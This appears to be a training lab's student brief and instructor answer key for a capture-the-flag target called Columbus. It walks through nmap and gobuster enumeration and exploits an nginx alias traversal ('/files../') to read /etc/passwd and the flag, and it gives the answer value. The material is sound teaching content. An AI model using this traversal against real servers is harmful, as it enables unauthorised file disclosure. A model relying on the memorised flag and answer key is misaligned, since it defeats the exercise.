# Columbus Student Brief

## General Instructions

On this subnet, `.254` is the lab router and is out of bounds.

The following docker containers are available to you as pre-installed tools helpful for the labs. Additional details are in the README.txt file on the Kali desktop.

- JavaChains

## Assigned Subnet

`192.168.18.0/24`

## Objective

From your assigned operations station, discover the host on the assigned subnet, gain appropriate access, and collect the flag.

The flag is obvious once you reach it. It is not intentionally hidden or obfuscated.

## Deliverable

Record the flag value for Columbus.

## PCTE range limitations

These limits apply on Persistent Cyber Training Environment (PCTE) ranges used by this Module. Treat the items below as a no-strike list when they exist. Not every item is present on every range or host.

Do not target, block, terminate, or delete range-control artifacts:

- **Network:** `10.0.0.0/8` (range control and instrumentation; do not block or flag that traffic). Routers past the edge-router in grey space. TCP `5672` (AMQP user-emulation on the control subnet), `49998`, and `49999`.
- **Accounts:** `range-admin` / `range_admin`, `range-control`, and `range`. Do not use accounts whose username or password contains `simspace`.
- **User emulation:** do not stop it. Typical paths: `C:\Program Files (x86)\Simspace\` and `C:\Users\<Username>\Simspace`. Scripts: `run-actuation.cmd`, `ueactuation.cmd`.
- **Directories:** `C:\Program Files\Puppet Labs` and the Simspace paths above.
- **Processes:** `java.exe`, `javaw.exe`, `ruby.exe`, `rubyw.exe`, `start.exe`, `chromedriver.exe`, `IEDriverServer.exe`, Metova, Selenium, WebDriver.

# Columbus — Instructor Answer Key

## Objective and starting context

Students start on the assigned operations station with only the city codename and subnet `192.168.18.0/24`. They must discover the live host, gain access, and recover the flag. The live instructor walkthrough is in this file.

Do not give students the service name, CVE, or host IP.

## Flag / reference table

|Item|Value|
|---|---|
|City|Columbus|
|Assigned subnet|`192.168.18.0/24`|
|Deploy flag key|`T9_FLAG`|
|Default flag|`ember-wolf`|
|Flag location on target|`/flag.txt` after access|

Rotate `T9_FLAG` in `environments/pcte_vulnhub_targets/.env` and restart the matching container when the class needs a new value. Grade against the live `.env` value, not only the default in this table.

## Initial situational awareness

Establish ops-station context before touching the assigned subnet. These commands are first-use literacy for this Module: run the full set, then interpret.

```
date -u
hostname
whoami
id
pwd
echo "$SHELL"
uname -a
cat /etc/os-release
who
w
ps aux
ss -tulpen
ss -tunap
ip a
ip -4 route
```

Why this matters:

- `date -u` and `hostname` fix remote time and host identity before any later log or packet evidence.
- `whoami`, `id`, `pwd`, and `echo "$SHELL"` lock user, session, and interpreter context.
- `uname -a` and `/etc/os-release` capture OS/runtime version.
- `who` / `w` and `ps aux` show active users and a process baseline.
- `ss -tulpen` (listeners) and `ss -tunap` (active sockets) give the required TCP+UDP picture.
- `ip -4 route` and `ip route get 192.168.18.10` show that the assigned subnet is already reachable via the default gateway.

Expected findings:

- The student is on the operations station (hostname `ops`), not on the city target. The shell is `zsh`.
- `ip -4 addr` shows the lab-facing address on `eth1` (this deployment: `172.16.123.100/24`). The `eth0` address `10.10.123.100/16` is not the path to this city subnet.
- `ip route get 192.168.18.10` uses the default gateway (this deployment: `via 172.16.123.253 dev eth1 src 172.16.123.100`). Do not add a route via `192.168.100.254`. That next hop does not answer, and a more-specific route would hide the working default path.
- Listening sockets on the ops station are local tooling, not the target. `ss` shows SSH and the local JavaChains listener on `8011/tcp`.

## Instructor live walkthrough

### Objective and starting context

Live instructor demo for the Columbus Module (`B02.M12`). Students know only the assigned subnet `192.168.18.0/24`. On this range, `.254` is the lab router on the segment and is out of bounds. Do not open with the product name, CVE, or host IP.

This walkthrough is rewritten onto the `192.168.18.0/24` student-facing range. Example host addresses in later steps use the `.10` (and, where present, `.11`) convention from the shared stack; treat those as discovered values, not pre-briefed facts.

The deploy flag key is `T9_FLAG`. Confirm the live `.env` value before grading.

### Required Tools

- `iproute2` (for `ip route get`. This ops station already has a path, so do not add a static route)
- `nmap` (for host discovery and port scanning)
- `gobuster` (for directory enumeration across the three nginx listeners)
- `curl` (for web enumeration and directory traversal)

### 1. Network Routing & Host Discovery

At the start of this scenario, we only know the target subnet: `192.168.18.0/24`. The operations station is on `172.16.123.0/24` (`eth1`). The city subnet is reached through the default gateway.

Confirm the path before scanning. `ip route get` prints the next hop and the source address the kernel will use:

```
ip route get 192.168.18.10
```

_Output:_

```
192.168.18.10 via 172.16.123.253 dev eth1 src 172.16.123.100 uid 1000
    cache
```

**Observation:** The subnet is already reachable. The source address is `172.16.123.100`.

**Inference:** Do not run `ip route add 192.168.18.0/24 via 192.168.100.254`. `192.168.100.254` does not answer on this range, and that more-specific route would override the working default path.

With connectivity available, find which addresses on the subnet actually answer. `nmap -sn` is a ping sweep: it checks host up/down and **does not** port-scan. That is cheaper than a full TCP scan of every IP, and we only have a subnet so far — we still need a live host before we care about services.

```
nmap -sn -n 192.168.18.0/24
```

_Why `-n`:_ skip reverse DNS. The ops station resolver (`172.16.123.253`) refuses DNS. Without `-n`, this sweep sits at full CPU and does not print hosts. With `-n`, the same sweep finishes in a few seconds.

_Output excerpt:_

```
Nmap scan report for 192.168.18.10
Host is up.
Nmap scan report for 192.168.18.254
Host is up.
```

**Observation:** Two hosts respond on this subnet. `192.168.18.1` does not.

**Inference:** The student brief marks `.254` as the lab router and out of bounds. Concentrate service enumeration on **192.168.18.10**.

### 2. Service Enumeration

We have a candidate IP. Next question: **what is listening, and what does it claim to be?** That takes a version scan, not another ping sweep.

```
nmap -Pn -sV -n -p- 192.168.18.10
```

_Why these options:_

- `-Pn` — skip nmap’s host-discovery probes. We already know `192.168.18.10` responded to `-sn`. This also keeps the scan going if the host later ignores ping but still serves TCP.
- `-n` — skip reverse DNS, same reason as the sweep. The resolver still refuses.
- `-sV` — version detection. We need the product string (here, **nginx 1.13.2** on three ports).
- `-p-` — all 65535 TCP ports, not nmap’s default top 1000. **8081** and **8082** would be easy to miss on a top-ports-only scan.

_Output excerpt:_

```
PORT     STATE SERVICE VERSION
8080/tcp open  http    nginx 1.13.2
8081/tcp open  http    nginx 1.13.2
8082/tcp open  http    nginx 1.13.2
```

**Observation:** Three HTTP listeners, all fingerprinted as **nginx 1.13.2**, on ports **8080**, **8081**, and **8082**.

**Inference:** Multiple virtual hosts or demo sites on one box. Nmap does not tell us which port has directory listings or unusual path handling — probe each root and a short list of common path names before committing to an exploit path.

#### Initial Web Probing — All Three Ports

nmap found **three** identical-looking HTTP listeners. The next check is the same question three times: “what does `GET /` return?” Doing that by hand is copy-paste with a high chance of skipping a port. A short shell loop is ordinary enumeration automation: one command, three results, same options every time.

```
for port in 8080 8081 8082; do
  curl -s -o /dev/null -w "$port / -> HTTP %{http_code}\n" \
    "http://192.168.18.10:$port/"
done
```

_What the loop is doing:_

- `for port in 8080 8081 8082` — bind `port` to each listener nmap listed, then run the body once per value.
- `curl` — one `GET /` per port.
- `-s` — silent; no progress meter mixed into the table.
- `-o /dev/null` — throw away the HTML body. We only need the **status code** to see that the three ports are not the same site.
- `-w "$port / -> HTTP %{http_code}\n"` — `curl` format string: print the loop variable, then the HTTP status (`%{http_code}`), then a newline. That is how three probes become three labeled lines.
- `"[http://192.168.18.10:](http://192.168.18.10:)$port/"` — `$port` is expanded by the shell, so the URL changes each iteration.

Same idea as gobuster next: when the work is **repetitive and identical except for one value** (port, host, wordlist entry), a loop or a scanner beats three separate commands.

_Output:_

```
8080 / -> HTTP 302
8081 / -> HTTP 200
8082 / -> HTTP 200
```

**Observation:** Port 8080 redirects; 8081 and 8082 return normal pages.

**Inference:** Treat all three as candidates until path enumeration shows a distinctive surface. Brute-force common web paths with **gobuster** and Kali’s SecLists wordlist rather than guessing lab-specific names:

```
for port in 8080 8081 8082; do
  echo "=== $port ==="
  gobuster dir -u "http://192.168.18.10:$port" \
    -w /usr/share/seclists/Discovery/Web-Content/common.txt \
    -t 40 --no-error
done
```

The gobuster loop is the same automation as the `curl` loop: three ports, one wordlist, do not retype the command. _`gobuster dir`_ requests `GET /{word}` for each wordlist line. _`-w`_ is SecLists `Discovery/Web-Content/common.txt`. _`-t 40`_ is thread count. _`--no-error`_ hides transient connection noise.

Sizes on this run (gobuster v3.8, SecLists `common.txt`): `index.html` is **521** bytes, `/test1` and `/test2` are **146** bytes, and `/static` is **301** size 185 on both 8081 and 8082. That does not change the lead. The **discriminator** is **`/files` on 8081**, which the other two ports do not show.

_Output excerpt (8080) — gobuster v3.8 stops; wildcard 302:_

```
the server returns a status code that matches the provided options for non existing urls. http://192.168.18.10:8080/<random>; => 302 (redirect to http://192.168.18.10:8080/<random>;) (Length: 161). Please exclude the response length or the status code or set the wildcard option.
```

_Output excerpt (8081):_

```
files                (Status: 301) [Size: 185] [--> http://192.168.18.10:8081/files/]
index.html           (Status: 200) [Size: 521]
static               (Status: 301) [Size: 185] [--> http://192.168.18.10:8081/static/]
```

_Output excerpt (8082):_

```
index.html           (Status: 200) [Size: 521]
static               (Status: 301) [Size: 185] [--> http://192.168.18.10:8082/static/]
test1                (Status: 200) [Size: 146]
test2                (Status: 200) [Size: 146]
```

**Observation:**

- **8080** answers unknown paths with the same **302** (length 161), so gobuster cannot tell real paths from noise (wildcard redirect).
- **8081** is the only port with **`/files`** (301 to `/files/`). `/static` is also a 301 on this port.
- **8082** has `/test1`, `/test2`, and the same `/static` 301, but **no** `/files`.

**Inference:** Follow **`8081 /files`**. 8080 and 8082 are other nginx demos on this Vulhub image; they are not required for the flag.

**Inference:** The distinctive lead is **`8081 /files`** — a real location unique to that port among these results. Follow `/files/` on **8081** and inspect the body before chasing 8080’s wildcard redirects or 8082’s `/test*` pages.

```
curl -s http://192.168.18.10:8081/files/
```

_Output excerpt:_

```
<html>
<head><title>Index of /files/</title></head>
<body bgcolor="white">
<h1>Index of /files/</h1><hr><pre><a href="../">../</a>
<a href="help.txt">help.txt</a>                                           08-Jul-2026 18:48                  22
</pre><hr></body>
</html>
```

**Observation:** The `<title>` and `<h1>` both say **Index of /files/**, and a real file (`help.txt`) is listed.

**Inference:** That is nginx **autoindex** ([`autoindex` module](https://nginx.org/en/docs/http/ngx_http_autoindex_module.html)) returning a directory listing. A browsable `/files/` location is often mapped to a filesystem directory via `alias` or `root` ([`alias` directive](https://nginx.org/en/docs/http/ngx_http_core_module.html#alias)).

_Search:_ `nginx alias trailing slash directory traversal` or `nginx location alias path traversal`

Those queries surface a well-documented misconfiguration: when `location` and `alias` disagree on a trailing slash, requests that append `../` **directly** to the location prefix can escape the intended directory ([Gixy: Nginx Alias Traversal](https://gixy.org/guides/path-traversal); [UK NCSC: nginx alias source-code disclosure](https://www.security.gov.uk/services-resources/cyber-services-government/domain-and-vulnerability-knowledge-base/nginx-alias-source-code-disclosure/)). For a location named `/files`, that pattern is **`/files../`** (not `/files/../`, which nginx normalizes before matching).

**Next probe:** Test whether `/files../` escapes the intended directory on port 8081.

### 3. Vulnerability Discovery

#### Automated Path

Not applicable for this target. The issue is a static nginx misconfiguration with a file-read primitive — there is no reliable Metasploit module or remote RCE PoC to run. Exploitation is ordinary `curl` against the mis-mapped location (Manual Path below).

#### Manual Path: Alias Prefix Escape

Append `../` directly to the location name (no extra slash between `files` and `..`):

```
curl -s http://192.168.18.10:8081/files../
```

_Output excerpt:_

```
<html>
<head><title>Index of /files../</title></head>
<body bgcolor="white">
<h1>Index of /files../</h1><hr><pre><a href="../">../</a>
<a href="bin/">bin/</a>                                               05-Jul-2017 19:35                   -
<a href="boot/">boot/</a>                                              04-Apr-2017 16:00                   -
<a href="dev/">dev/</a>                                               08-Oct-2026 15:45                   -
<a href="etc/">etc/</a>                                               09-Jul-2026 13:40                   -
<a href="home/">home/</a>                                              08-Jul-2026 18:48                   -
...
```

**Observation:** The listing now shows top-level directories such as `bin/`, `etc/`, and `home/` — the container root (`/`), not just `/files/`. Autoindex is still enabled. The clocks in that listing are file mtimes and shift when the image is rebuilt. The evidence is the names, not the dates.

**Inference:** Path alias directory traversal is confirmed (arbitrary directory listing / read).

#### Vulnerability Mechanics

Nginx `alias` replaces the matched location prefix with a filesystem path. When `location /files` has **no** trailing slash but `alias /home/` does, a request for `/files../` is prefix-matched as `/files` + `../`, and alias substitution can escape above `/home/`. The Vulhub lab for this target documents the same pattern in `vulnhub/nginx/insecure-configuration/README.md` (“Mistake 2. Directory Traversal Vulnerability”) with payload `http://your-ip:8081/files../`.

#### Failed Attempt: Standard Directory Traversal

Traditional `../` segments in the middle of the path are normalized before location matching and do not trigger the alias bug:

```
curl -s -I http://192.168.18.10:8081/files/../../../etc/passwd
```

_Output excerpt:_

```
HTTP/1.1 404 Not Found
Server: nginx/1.13.2
```

_What we learned:_ The exploit requires `../` appended **directly** to the location string (`/files../`), not normalized traversal like `/files/../../../etc/passwd`.

### 4. File read (no shell)

This target is a **static nginx** file server. There is no application upload on 8081 and no way to turn directory read into code execution, so there is no reverse shell. There is also no Metasploit module for this alias bug (section 3). Stay on `curl`.

**Primary path:** use the file-read primitive directly for the flag (Step 5). Prove arbitrary file read on a sensitive path first:

```
curl -s http://192.168.18.10:8081/files../etc/passwd
```

_Output excerpt:_

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
...
```

**Observation:** File contents are returned inline in the response body (not another HTML index page) because `/etc/passwd` is a file, not a directory.

**Inference:** Any readable path under the container root — including `/flag.txt` — can be fetched the same way.

### 5. Retrieve the Flag

Use the same traversal prefix to list `/` and look for `flag.txt`:

```
curl -s http://192.168.18.10:8081/files../ | grep flag.txt
```

_Output:_

```
<a href="flag.txt">flag.txt</a>                                           08-Oct-2026 15:45                  11
```

Size **11** is the stable part of that line. The date is the file mtime.

Retrieve the flag:

```
curl -s http://192.168.18.10:8081/files../flag.txt
```

_Output:_

```
ember-wolf
```

Target 9 is complete.

## Troubleshooting / confirmation

- If the subnet does not respond, confirm the stack is up and `ip route get 192.168.18.10` still uses the default gateway. Do not add a route via `192.168.100.254`.
- If `nmap -sn` never prints hosts, rerun it with `-n`.
- If the recovered string does not match this table, read the live `T9_FLAG` from `.env` before marking the quiz wrong.
- If students name a CVE or product before they have service evidence, redirect them to host discovery and version output.
- The city subnet for this module is `192.168.18.0/24`. The ops-station address can change with DHCP; take it from `ip route get`, not from a remembered `172.16.123.100`.

## Grading checkpoints

|Checkpoint|Acceptable evidence|
|---|---|
|Assigned subnet used|Student worked `192.168.18.0/24` (or the live remapped equivalent)|
|Host discovered|Live host identified from a subnet sweep, not from a handed IP|
|Access gained|Command or session evidence that reached the target filesystem|
|Flag submitted|Quiz value matches live `T9_FLAG` (default `ember-wolf`)|

Accept a correct live flag even if the student used a valid alternate exploit path. Do not award the quiz for a walkthrough dump without the flag.